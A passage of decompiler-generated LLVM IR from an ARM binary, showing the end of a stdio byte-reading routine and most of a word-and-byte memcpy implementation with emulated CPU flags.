  %v0_17e28 = load i32, i32* @r4, align 4
  %v1_17e28 = add i32 %v0_17e28, 20
  %v2_17e28 = inttoptr i32 %v1_17e28 to i32*
  %v3_17e28 = load i32, i32* %v2_17e28, align 4
  %v2_17e2c = add i32 %v0_17e28, 24
  %v3_17e2c = inttoptr i32 %v2_17e2c to i32*
  store i32 %v3_17e28, i32* %v3_17e2c, align 4
  %v0_17e30 = load i32, i32* @r4, align 4
  %v1_17e30 = add i32 %v0_17e30, 16
  %v2_17e30 = inttoptr i32 %v1_17e30 to i32*
  %v3_17e30 = load i32, i32* %v2_17e30, align 4
  %v1_17e34 = inttoptr i32 %v3_17e30 to i8*
  %v2_17e34 = load i8, i8* %v1_17e34, align 1
  %v3_17e34 = zext i8 %v2_17e34 to i32
  store i32 %v3_17e34, i32* %r0.global-to-local, align 4
  %v5_17e34 = add i32 %v3_17e30, 1
  store i32 %v5_17e34, i32* %v2_17e30, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e40:                               ; preds = %bb20
  %v1_17e40 = inttoptr i32 %v0_17e04 to i8*
  store i32 %v0_17e04, i32* %r0.global-to-local, align 4
  %v2_17e44 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_17e44, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17e4c = call i32 @__stdio_READ(i8* %v1_17e40, i32 %v2_17e44, i32 1)
  store i32 %v5_17e4c, i32* %r0.global-to-local, align 4
  %v2_17e50 = icmp eq i32 %v5_17e4c, 0
  br i1 %v2_17e50, label %dec_label_pc_17e5c, label %bb21

bb21:                                             ; preds = %dec_label_pc_17e40
  %v4_17e54 = load i8, i8* %stack_var_-9, align 1
  %v5_17e54 = sext i8 %v4_17e54 to i32
  store i32 %v5_17e54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e5c:                               ; preds = %dec_label_pc_17e40, %dec_label_pc_17d70, %dec_label_pc_17e14
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e60:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_17e28, %dec_label_pc_17df0, %dec_label_pc_17e5c
  %v2_17e64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17e64, i32* @r4, align 4
  %v8_17e64 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_17e64

; uselistorder directives
  uselistorder i32 %v2_17dc0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17d80, { 1, 0, 2 }
  uselistorder i32 %v2_17dcc, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_17d40, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_262a8.818, { 2, 1, 0 }
  uselistorder i32** @global_var_26270.851, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17e60, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_17e5c, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17df0, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17e70 = load i32, i32* @r1, align 4
  %v1_17e70 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e70 = sub i32 %v0_17e70, %v1_17e70
  %v3_17e70 = icmp ult i32 %v0_17e70, %v1_17e70
  %v4_17e70 = xor i32 %v1_17e70, %v0_17e70
  %v5_17e70 = xor i32 %v2_17e70, %v0_17e70
  %v6_17e70 = and i32 %v5_17e70, %v4_17e70
  %v7_17e70 = icmp slt i32 %v6_17e70, 0
  store i1 %v7_17e70, i1* %cpsr_v.global-to-local, align 1
  %v8_17e70 = icmp slt i32 %v2_17e70, 0
  store i1 %v8_17e70, i1* %cpsr_n.global-to-local, align 1
  %v9_17e70 = icmp eq i32 %v0_17e70, %v1_17e70
  store i1 %v9_17e70, i1* @cpsr_z, align 1
  br i1 %v3_17e70, label %dec_label_pc_180bc, label %dec_label_pc_17e78

dec_label_pc_17e78:                               ; preds = %entry
  br i1 %v9_17e70, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_17e78
  %merge = phi i32 [ %v0_17e70, %dec_label_pc_17e78 ], [ %v2_18150, %bb143 ], [ %v11_1816c, %bb146 ], [ %v7_1816c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17e78
  %v5_17e7c = inttoptr i32 %v1_17e70 to i8*
  store i8* %v5_17e7c, i8** %stack_var_-8, align 4
  %v0_17e80 = load i32, i32* @r2, align 4
  %v2_17e80 = add i32 %v0_17e80, -4
  store i32 %v2_17e80, i32* %r2.global-to-local, align 4
  %v4_17e80 = sub i32 3, %v0_17e80
  %v5_17e80 = and i32 %v4_17e80, %v0_17e80
  %v6_17e80 = icmp slt i32 %v5_17e80, 0
  store i1 %v6_17e80, i1* %cpsr_v.global-to-local, align 1
  %v7_17e80 = icmp slt i32 %v2_17e80, 0
  store i1 %v7_17e80, i1* %cpsr_n.global-to-local, align 1
  %v5_17e84 = icmp slt i32 %v0_17e80, 4
  br i1 %v5_17e84, label %bb133, label %dec_label_pc_17e88

dec_label_pc_17e88:                               ; preds = %bb
  %v1_17e88 = urem i32 %v1_17e70, 4
  store i32 %v1_17e88, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17e88 = icmp eq i32 %v1_17e88, 0
  br i1 %v2_17e88, label %dec_label_pc_17e90, label %dec_label_pc_17f34

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e88
  %v1_17e90 = urem i32 %v0_17e70, 4
  store i32 %v1_17e90, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17e90 = icmp eq i32 %v1_17e90, 0
  %extract.t = trunc i32 %v0_17e70 to i2
  br i1 %v2_17e90, label %dec_label_pc_17e98, label %dec_label_pc_17f64

dec_label_pc_17e98:                               ; preds = %dec_label_pc_17e90, %dec_label_pc_17f5c
  %v0_17eb093 = phi i32 [ %v1_17e70, %dec_label_pc_17e90 ], [ %v0_17fac76, %dec_label_pc_17f5c ]
  %v0_17eac92 = phi i32 [ %v0_17e70, %dec_label_pc_17e90 ], [ %v0_17f5c, %dec_label_pc_17f5c ]
  %v0_17e98 = phi i32 [ %v2_17e80, %dec_label_pc_17e90 ], [ %v2_17f54, %dec_label_pc_17f5c ]
  %v2_17e98 = add i32 %v0_17e98, -8
  store i32 %v2_17e98, i32* %r2.global-to-local, align 4
  %v4_17e98 = sub i32 7, %v0_17e98
  %v5_17e98 = and i32 %v4_17e98, %v0_17e98
  %v6_17e98 = icmp slt i32 %v5_17e98, 0
  store i1 %v6_17e98, i1* %cpsr_v.global-to-local, align 1
  %v7_17e98 = icmp slt i32 %v2_17e98, 0
  store i1 %v7_17e98, i1* %cpsr_n.global-to-local, align 1
  %v5_17e9c = icmp slt i32 %v0_17e98, 8
  br i1 %v5_17e9c, label %dec_label_pc_17eec, label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e98
  %v2_17ea0 = add i32 %v0_17e98, -28
  store i32 %v2_17ea0, i32* %r2.global-to-local, align 4
  %v4_17ea0 = sub i32 27, %v0_17e98
  %v5_17ea0 = and i32 %v4_17ea0, %v2_17e98
  %v6_17ea0 = icmp slt i32 %v5_17ea0, 0
  store i1 %v6_17ea0, i1* %cpsr_v.global-to-local, align 1
  %v7_17ea0 = icmp slt i32 %v2_17ea0, 0
  store i1 %v7_17ea0, i1* %cpsr_n.global-to-local, align 1
  %v5_17ea4 = icmp slt i32 %v2_17e98, 20
  br i1 %v5_17ea4, label %dec_label_pc_17ed8, label %dec_label_pc_17ea8

dec_label_pc_17ea8:                               ; preds = %dec_label_pc_17ea0
  %v0_17ea8 = load i32, i32* @r4, align 4
  store i32 %v0_17ea8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17eac

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17eac.dec_label_pc_17eac_crit_edge, %dec_label_pc_17ea8
  %v0_17eb0 = phi i32 [ %v12_17eb8, %dec_label_pc_17eac.dec_label_pc_17eac_crit_edge ], [ %v0_17eb093, %dec_label_pc_17ea8 ]
  %v0_17eac = phi i32 [ %v0_17eac.pre, %dec_label_pc_17eac.dec_label_pc_17eac_crit_edge ], [ %v0_17eac92, %dec_label_pc_17ea8 ]
  %v1_17eac = inttoptr i32 %v0_17eac to i32*
  %v2_17eac = load i32, i32* %v1_17eac, align 4
  store i32 %v2_17eac, i32* %r3.global-to-local, align 4
  %v3_17eac = add i32 %v0_17eac, 4
  %v4_17eac = inttoptr i32 %v3_17eac to i32*
  %v5_17eac = load i32, i32* %v4_17eac, align 4
  store i32 %v5_17eac, i32* %r4.global-to-local, align 4
  %v6_17eac = add i32 %v0_17eac, 8
  %v7_17eac = inttoptr i32 %v6_17eac to i32*
  %v8_17eac = load i32, i32* %v7_17eac, align 4
  store i32 %v8_17eac, i32* %ip.global-to-local, align 4
  %v9_17eac = add i32 %v0_17eac, 12
  %v10_17eac = inttoptr i32 %v9_17eac to i32*
  %v11_17eac = load i32, i32* %v10_17eac, align 4
  store i32 %v11_17eac, i32* %lr.global-to-local, align 4
  %v12_17eac = add i32 %v0_17eac, 16
  store i32 %v12_17eac, i32* %r1.global-to-local, align 4
  %v1_17eb0 = inttoptr i32 %v0_17eb0 to i32*
  store i32 %v2_17eac, i32* %v1_17eb0, align 4
  %v3_17eb0 = add i32 %v0_17eb0, 4
  %v4_17eb0 = inttoptr i32 %v3_17eb0 to i32*
  %v5_17eb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17eb0, i32* %v4_17eb0, align 4
  %v6_17eb0 = add i32 %v0_17eb0, 8
  %v7_17eb0 = inttoptr i32 %v6_17eb0 to i32*
  %v8_17eb0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17eb0, i32* %v7_17eb0, align 4
  %v9_17eb0 = add i32 %v0_17eb0, 12
  %v10_17eb0 = inttoptr i32 %v9_17eb0 to i32*
  %v11_17eb0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17eb0, i32* %v10_17eb0, align 4
  %v12_17eb0 = add i32 %v0_17eb0, 16
  store i32 %v12_17eb0, i32* %r0.global-to-local, align 4
  %v0_17eb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17eb4 = inttoptr i32 %v0_17eb4 to i32*
  %v2_17eb4 = load i32, i32* %v1_17eb4, align 4
  store i32 %v2_17eb4, i32* %r3.global-to-local, align 4
  %v3_17eb4 = add i32 %v0_17eb4, 4
  %v4_17eb4 = inttoptr i32 %v3_17eb4 to i32*
  %v5_17eb4 = load i32, i32* %v4_17eb4, align 4
  store i32 %v5_17eb4, i32* %r4.global-to-local, align 4
  %v6_17eb4 = add i32 %v0_17eb4, 8
  %v7_17eb4 = inttoptr i32 %v6_17eb4 to i32*
  %v8_17eb4 = load i32, i32* %v7_17eb4, align 4
  store i32 %v8_17eb4, i32* @ip, align 4
  %v9_17eb4 = add i32 %v0_17eb4, 12
  %v10_17eb4 = inttoptr i32 %v9_17eb4 to i32*
  %v11_17eb4 = load i32, i32* %v10_17eb4, align 4
  store i32 %v11_17eb4, i32* @lr, align 4
  %v12_17eb4 = add i32 %v0_17eb4, 16
  store i32 %v12_17eb4, i32* @r1, align 4
  %v1_17eb8 = inttoptr i32 %v12_17eb0 to i32*
  store i32 %v2_17eb4, i32* %v1_17eb8, align 4
  %v3_17eb8 = add i32 %v0_17eb0, 20
  %v4_17eb8 = inttoptr i32 %v3_17eb8 to i32*
  %v5_17eb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17eb8, i32* %v4_17eb8, align 4
  %v6_17eb8 = add i32 %v0_17eb0, 24
  %v7_17eb8 = inttoptr i32 %v6_17eb8 to i32*
  %v8_17eb8 = load i32, i32* @ip, align 4
  store i32 %v8_17eb8, i32* %v7_17eb8, align 4
  %v9_17eb8 = add i32 %v0_17eb0, 28
  %v10_17eb8 = inttoptr i32 %v9_17eb8 to i32*
  %v11_17eb8 = load i32, i32* @lr, align 4
  store i32 %v11_17eb8, i32* %v10_17eb8, align 4
  %v12_17eb8 = add i32 %v0_17eb0, 32
  store i32 %v12_17eb8, i32* %r0.global-to-local, align 4
  %v0_17ebc = load i32, i32* %r2.global-to-local, align 4
  %v2_17ebc = add i32 %v0_17ebc, -32
  store i32 %v2_17ebc, i32* %r2.global-to-local, align 4
  %v6_17ec0 = icmp slt i32 %v0_17ebc, 32
  br i1 %v6_17ec0, label %dec_label_pc_17ec4, label %dec_label_pc_17eac.dec_label_pc_17eac_crit_edge

dec_label_pc_17eac.dec_label_pc_17eac_crit_edge:  ; preds = %dec_label_pc_17eac
  %v0_17eac.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17eac

dec_label_pc_17ec4:                               ; preds = %dec_label_pc_17eac
  %v4_17ec4 = add i32 %v0_17ebc, -16
  %v6_17ec4 = add i32 %v0_17ebc, 2147483616
  %v7_17ec4 = and i32 %v4_17ec4, %v6_17ec4
  %v8_17ec4 = icmp slt i32 %v7_17ec4, 0
  store i1 %v8_17ec4, i1* %cpsr_v.global-to-local, align 1
  %v9_17ec4 = icmp slt i32 %v4_17ec4, 0
  store i1 %v9_17ec4, i1* %cpsr_n.global-to-local, align 1
  %v5_17ec8 = icmp slt i32 %v2_17ebc, -16
  br i1 %v5_17ec8, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_17ec4
  %v6_17ec8 = load i32, i32* @r1, align 4
  %v7_17ec8 = inttoptr i32 %v6_17ec8 to i32*
  %v8_17ec8 = load i32, i32* %v7_17ec8, align 4
  store i32 %v8_17ec8, i32* %r3.global-to-local, align 4
  %v9_17ec8 = add i32 %v6_17ec8, 4
  %v10_17ec8 = inttoptr i32 %v9_17ec8 to i32*
  %v11_17ec8 = load i32, i32* %v10_17ec8, align 4
  store i32 %v11_17ec8, i32* %r4.global-to-local, align 4
  %v12_17ec8 = add i32 %v6_17ec8, 8
  %v13_17ec8 = inttoptr i32 %v12_17ec8 to i32*
  %v14_17ec8 = load i32, i32* %v13_17ec8, align 4
  store i32 %v14_17ec8, i32* @ip, align 4
  %v15_17ec8 = add i32 %v6_17ec8, 12
  %v16_17ec8 = inttoptr i32 %v15_17ec8 to i32*
  %v17_17ec8 = load i32, i32* %v16_17ec8, align 4
  store i32 %v17_17ec8, i32* @lr, align 4
  %v18_17ec8 = add i32 %v6_17ec8, 16
  store i32 %v18_17ec8, i32* @r1, align 4
  %v7_17ecc = inttoptr i32 %v12_17eb8 to i32*
  store i32 %v8_17ec8, i32* %v7_17ecc, align 4
  %v9_17ecc = add i32 %v0_17eb0, 36
  %v10_17ecc = inttoptr i32 %v9_17ecc to i32*
  %v11_17ecc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_17ecc, i32* %v10_17ecc, align 4
  %v12_17ecc = add i32 %v0_17eb0, 40
  %v13_17ecc = inttoptr i32 %v12_17ecc to i32*
  %v14_17ecc = load i32, i32* @ip, align 4
  store i32 %v14_17ecc, i32* %v13_17ecc, align 4
  %v15_17ecc = add i32 %v0_17eb0, 44
  %v16_17ecc = inttoptr i32 %v15_17ecc to i32*
  %v17_17ecc = load i32, i32* @lr, align 4
  store i32 %v17_17ecc, i32* %v16_17ecc, align 4
  %v18_17ecc = add i32 %v0_17eb0, 48
  store i32 %v18_17ecc, i32* %r0.global-to-local, align 4
  %v6_17ed0 = load i32, i32* %r2.global-to-local, align 4
  %v7_17ed0 = add i32 %v6_17ed0, -16
  store i32 %v7_17ed0, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17ec4, %bb130
  %v3_17ee0102 = phi i32 [ %v12_17eb8, %dec_label_pc_17ec4 ], [ %v18_17ecc, %bb130 ]
  %v0_17ed896 = phi i32 [ %v2_17ebc, %dec_label_pc_17ec4 ], [ %v7_17ed0, %bb130 ]
  %v2_17ed4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17ed4, i32* @r4, align 4
  br label %dec_label_pc_17ed8

dec_label_pc_17ed8:                               ; preds = %dec_label_pc_17ea0, %.thread2
  %v3_17ee0101 = phi i32 [ %v0_17eb093, %dec_label_pc_17ea0 ], [ %v3_17ee0102, %.thread2 ]
  %v0_17ed8 = phi i32 [ %v2_17ea0, %dec_label_pc_17ea0 ], [ %v0_17ed896, %.thread2 ]
  %v1_17ed8 = add i32 %v0_17ed8, 20
  store i32 %v1_17ed8, i32* %r2.global-to-local, align 4
  %v3_17ed8 = sub i32 0, %v0_17ed8
  %v4_17ed8 = and i32 %v1_17ed8, %v3_17ed8
  %v5_17ed8 = icmp slt i32 %v4_17ed8, 0
  store i1 %v5_17ed8, i1* %cpsr_v.global-to-local, align 1
  %v6_17ed8 = icmp slt i32 %v1_17ed8, 0
  store i1 %v6_17ed8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %.thread118, %dec_label_pc_17ed8
  %v0_17eec.pre149 = phi i32 [ %v0_17eec.pre, %.thread118 ], [ %v1_17ed8, %dec_label_pc_17ed8 ]
  %v3_17ee0 = phi i32 [ %v3_17ee099119, %.thread118 ], [ %v3_17ee0101, %dec_label_pc_17ed8 ]
  %v1_17ee4 = phi i1 [ %v1_17ee8, %.thread118 ], [ %v5_17ed8, %dec_label_pc_17ed8 ]
  %v0_17ee4 = phi i1 [ %v0_17ee8, %.thread118 ], [ %v6_17ed8, %dec_label_pc_17ed8 ]
  %v2_17edc = xor i1 %v1_17ee4, %v0_17ee4
  br i1 %v2_17edc, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_17edc
  %v3_17edc = load i32, i32* @r1, align 4
  %v4_17edc = inttoptr i32 %v3_17edc to i32*
  %v5_17edc = load i32, i32* %v4_17edc, align 4
  store i32 %v5_17edc, i32* %r3.global-to-local, align 4
  %v6_17edc = add i32 %v3_17edc, 4
  %v7_17edc = inttoptr i32 %v6_17edc to i32*
  %v8_17edc = load i32, i32* %v7_17edc, align 4
  store i32 %v8_17edc, i32* @ip, align 4
  %v9_17edc = add i32 %v3_17edc, 8
  %v10_17edc = inttoptr i32 %v9_17edc to i32*
  %v11_17edc = load i32, i32* %v10_17edc, align 4
  store i32 %v11_17edc, i32* @lr, align 4
  %v12_17edc = add i32 %v3_17edc, 12
  store i32 %v12_17edc, i32* @r1, align 4
  %v4_17ee0 = inttoptr i32 %v3_17ee0 to i32*
  store i32 %v5_17edc, i32* %v4_17ee0, align 4
  %v6_17ee0 = add i32 %v3_17ee0, 4
  %v7_17ee0 = inttoptr i32 %v6_17ee0 to i32*
  %v8_17ee0 = load i32, i32* @ip, align 4
  store i32 %v8_17ee0, i32* %v7_17ee0, align 4
  %v9_17ee0 = add i32 %v3_17ee0, 8
  %v10_17ee0 = inttoptr i32 %v9_17ee0 to i32*
  %v11_17ee0 = load i32, i32* @lr, align 4
  store i32 %v11_17ee0, i32* %v10_17ee0, align 4
  %v12_17ee0 = add i32 %v3_17ee0, 12
  store i32 %v12_17ee0, i32* %r0.global-to-local, align 4
  %v3_17ee4 = load i32, i32* %r2.global-to-local, align 4
  %v4_17ee4 = add i32 %v3_17ee4, -12
  store i32 %v4_17ee4, i32* %r2.global-to-local, align 4
  %v6_17ee4 = sub i32 11, %v3_17ee4
  %v7_17ee4 = and i32 %v6_17ee4, %v3_17ee4
  %v8_17ee4 = icmp slt i32 %v7_17ee4, 0
  store i1 %v8_17ee4, i1* %cpsr_v.global-to-local, align 1
  %v9_17ee4 = icmp slt i32 %v4_17ee4, 0
  store i1 %v9_17ee4, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_17edc, %bb131
  %v0_17eec.pre = phi i32 [ %v4_17ee4, %bb131 ], [ %v0_17eec.pre149, %dec_label_pc_17edc ]
  %v3_17ee099119 = phi i32 [ %v12_17ee0, %bb131 ], [ %v3_17ee0, %dec_label_pc_17edc ]
  %v1_17ee8 = phi i1 [ %v8_17ee4, %bb131 ], [ %v1_17ee4, %dec_label_pc_17edc ]
  %v0_17ee8 = phi i1 [ %v9_17ee4, %bb131 ], [ %v0_17ee4, %dec_label_pc_17edc ]
  %v2_17ee8 = xor i1 %v1_17ee8, %v0_17ee8
  br i1 %v2_17ee8, label %dec_label_pc_17eec, label %dec_label_pc_17edc

dec_label_pc_17eec:                               ; preds = %.thread118, %dec_label_pc_17e98
  %v7_17efc = phi i32 [ %v0_17eb093, %dec_label_pc_17e98 ], [ %v3_17ee099119, %.thread118 ]
  %v0_17eec = phi i32 [ %v2_17e98, %dec_label_pc_17e98 ], [ %v0_17eec.pre, %.thread118 ]
  %v2_17eec = add i32 %v0_17eec, 8
  store i32 %v2_17eec, i32* %r2.global-to-local, align 4
  %v4_17eec = sub i32 0, %v0_17eec
  %v5_17eec = and i32 %v2_17eec, %v4_17eec
  %v6_17eec = icmp slt i32 %v5_17eec, 0
  store i1 %v6_17eec, i1* %cpsr_v.global-to-local, align 1
  %v7_17eec = icmp slt i32 %v2_17eec, 0
  store i1 %v7_17eec, i1* %cpsr_n.global-to-local, align 1
  %v5_17ef0 = icmp slt i32 %v0_17eec, -8
  br i1 %v5_17ef0, label %bb133, label %dec_label_pc_17ef4

dec_label_pc_17ef4:                               ; preds = %dec_label_pc_17eec
  %v6_17ef4 = add i32 %v0_17eec, 4
  store i32 %v6_17ef4, i32* %r2.global-to-local, align 4
  %v8_17ef4 = sub i32 -5, %v0_17eec
  %v9_17ef4 = and i32 %v8_17ef4, %v2_17eec
  %v10_17ef4 = icmp slt i32 %v9_17ef4, 0
  store i1 %v10_17ef4, i1* %cpsr_v.global-to-local, align 1
  %v11_17ef4 = icmp slt i32 %v6_17ef4, 0
  store i1 %v11_17ef4, i1* %cpsr_n.global-to-local, align 1
  %v5_17ef8 = icmp slt i32 %v2_17eec, 4
  %v6_17ef8 = load i32, i32* @r1, align 4
  %v7_17ef8 = inttoptr i32 %v6_17ef8 to i32*
  %v8_17ef8 = load i32, i32* %v7_17ef8, align 4
  store i32 %v8_17ef8, i32* %r3.global-to-local, align 4
  %v10_17ef8 = add i32 %v6_17ef8, 4
  br i1 %v5_17ef8, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_17ef4
  store i32 %v10_17ef8, i32* @r1, align 4
  %v8_17efc = inttoptr i32 %v7_17efc to i32*
  store i32 %v8_17ef8, i32* %v8_17efc, align 4
  %v9_17efc = load i32, i32* %r0.global-to-local, align 4
  %v10_17efc = add i32 %v9_17efc, 4
  store i32 %v10_17efc, i32* %r0.global-to-local, align 4
  %v0_17f0c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_17ef4
  %v10_17f00 = inttoptr i32 %v10_17ef8 to i32*
  %v11_17f00 = load i32, i32* %v10_17f00, align 4
  store i32 %v11_17f00, i32* @ip, align 4
  %v12_17f00 = add i32 %v6_17ef8, 8
  store i32 %v12_17f00, i32* @r1, align 4
  %v7_17f04 = inttoptr i32 %v7_17efc to i32*
  store i32 %v8_17ef8, i32* %v7_17f04, align 4
  %v9_17f04 = add i32 %v7_17efc, 4
  %v10_17f04 = inttoptr i32 %v9_17f04 to i32*
  %v11_17f04 = load i32, i32* @ip, align 4
  store i32 %v11_17f04, i32* %v10_17f04, align 4
  %v12_17f04 = add i32 %v7_17efc, 8
  store i32 %v12_17f04, i32* %r0.global-to-local, align 4
  %v6_17f08 = load i32, i32* %r2.global-to-local, align 4
  %v7_17f08 = add i32 %v6_17f08, -4
  store i32 %v7_17f08, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_17eec, %bb, %dec_label_pc_180b4, %dec_label_pc_17fdc, %dec_label_pc_18048, %bb132
  %v2_17f1c = phi i32 [ %v10_17efc, %.thread6 ], [ %v0_17fac76, %.thread12 ], [ %v7_17efc, %dec_label_pc_17eec ], [ %v1_17e70, %bb ], [ %v2_17f1c114, %dec_label_pc_180b4 ], [ %v2_17f1c113, %dec_label_pc_17fdc ], [ %v2_17f1c112, %dec_label_pc_18048 ], [ %v12_17f04, %bb132 ]
  %v0_17f0c = phi i32 [ %v0_17f0c.pre, %.thread6 ], [ %v2_17f54, %.thread12 ], [ %v2_17eec, %dec_label_pc_17eec ], [ %v2_17e80, %bb ], [ %v0_17f0c110, %dec_label_pc_180b4 ], [ %v0_17f0c109, %dec_label_pc_17fdc ], [ %v0_17f0c108, %dec_label_pc_18048 ], [ %v7_17f08, %bb132 ]
  %v1_17f0c = add i32 %v0_17f0c, 4
  store i32 %v1_17f0c, i32* @r2, align 4
  %v3_17f0c = sub i32 0, %v0_17f0c
  %v4_17f0c = and i32 %v1_17f0c, %v3_17f0c
  %v5_17f0c = icmp slt i32 %v4_17f0c, 0
  store i1 %v5_17f0c, i1* %cpsr_v.global-to-local, align 1
  %v6_17f0c = icmp slt i32 %v1_17f0c, 0
  store i1 %v6_17f0c, i1* %cpsr_n.global-to-local, align 1
  %v7_17f0c = icmp eq i32 %v1_17f0c, 0
  store i1 %v7_17f0c, i1* @cpsr_z, align 1
  br i1 %v7_17f0c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_17f10 = load i8*, i8** %stack_var_-8, align 4
  %v4_17f10 = ptrtoint i8* %v3_17f10 to i32
  store i32 %v4_17f10, i32* %r0.global-to-local, align 4
  ret i32 %v4_17f10

bb135:                                            ; preds = %bb133
  %v1_17f14 = add i32 %v0_17f0c, 2
  %v3_17f14 = sub i32 -3, %v0_17f0c
  %v4_17f14 = and i32 %v3_17f14, %v1_17f0c
  %v5_17f14 = icmp slt i32 %v4_17f14, 0
  store i1 %v5_17f14, i1* %cpsr_v.global-to-local, align 1
  %v6_17f14 = icmp slt i32 %v1_17f14, 0
  store i1 %v6_17f14, i1* %cpsr_n.global-to-local, align 1
  %v7_17f14 = icmp eq i32 %v1_17f0c, 2
  store i1 %v7_17f14, i1* @cpsr_z, align 1
  %v0_17f18 = load i32, i32* @r1, align 4
  %v1_17f18 = inttoptr i32 %v0_17f18 to i8*
  %v2_17f18 = load i8, i8* %v1_17f18, align 1
  %v3_17f18 = zext i8 %v2_17f18 to i32
  store i32 %v3_17f18, i32* %r3.global-to-local, align 4
  %v5_17f18 = add i32 %v0_17f18, 1
  store i32 %v5_17f18, i32* @r1, align 4
  %v3_17f1c = inttoptr i32 %v2_17f1c to i8*
  store i8 %v2_17f18, i8* %v3_17f1c, align 1
  %v4_17f1c = load i32, i32* %r0.global-to-local, align 4
  %v5_17f1c = add i32 %v4_17f1c, 1
  store i32 %v5_17f1c, i32* %r0.global-to-local, align 4
  %v0_17f20 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17f20 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17f20 = xor i1 %v0_17f20, %v1_17f20
  br i1 %v2_17f20, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_17f20 = load i32, i32* @r1, align 4
  %v4_17f20 = inttoptr i32 %v3_17f20 to i8*
  %v5_17f20 = load i8, i8* %v4_17f20, align 1
  %v6_17f20 = zext i8 %v5_17f20 to i32
  store i32 %v6_17f20, i32* %r3.global-to-local, align 4
  %v8_17f20 = add i32 %v3_17f20, 1
  store i32 %v8_17f20, i32* @r1, align 4
  %v6_17f24 = inttoptr i32 %v5_17f1c to i8*
  store i8 %v5_17f20, i8* %v6_17f24, align 1
  %v7_17f24 = load i32, i32* %r0.global-to-local, align 4
  %v8_17f24 = add i32 %v7_17f24, 1
  store i32 %v8_17f24, i32* %r0.global-to-local, align 4
  %v1_17f28.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17f28.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_17f2c = phi i32 [ %v8_17f24, %bb136 ], [ %v5_17f1c, %bb135 ]
  %v2_17f2c = phi i1 [ %v2_17f28.pre, %bb136 ], [ %v1_17f20, %bb135 ]
  %v1_17f2c = phi i1 [ %v1_17f28.pre, %bb136 ], [ %v0_17f20, %bb135 ]
  %v0_17f28 = load i1, i1* @cpsr_z, align 1
  %v3_17f28 = xor i1 %v2_17f2c, %v1_17f2c
  %v4_17f28 = or i1 %v0_17f28, %v3_17f28
  br i1 %v4_17f28, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_17f28 = load i32, i32* @r1, align 4
  %v6_17f28 = inttoptr i32 %v5_17f28 to i8*
